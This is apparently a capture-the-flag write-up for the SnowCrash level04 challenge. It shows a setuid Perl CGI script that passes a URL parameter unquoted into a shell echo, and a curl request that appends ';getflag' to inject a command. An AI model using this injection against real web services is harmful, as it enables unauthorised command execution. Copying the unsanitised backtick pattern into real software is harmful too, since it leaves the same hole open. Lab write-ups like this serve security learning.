```bash
level04@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
-r-x------  1 level04 level04  675 Apr  3  2012 .profile*
```
Ok so here we can see a pearl file
if we can it :
```bash
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
we can see that there is a server running on the localhost with the port 4747
we can see that the param given in the x in the url will be printed in an echo
which means that a bash command is made. Which means that we can put whatever we want.

```bash
level04@SnowCrash:~$ curl "localhost:4747/?x=%3Bgetflag"

Check flag.Here is your token : <hidden>
```
How does it work ?
the ?x means that we will give an x value, the %3B is the url version of a ';' so that we can stop the echo that asyou can see doesn't have the quotes
and then we execute getflag
GGGGG we have the flag
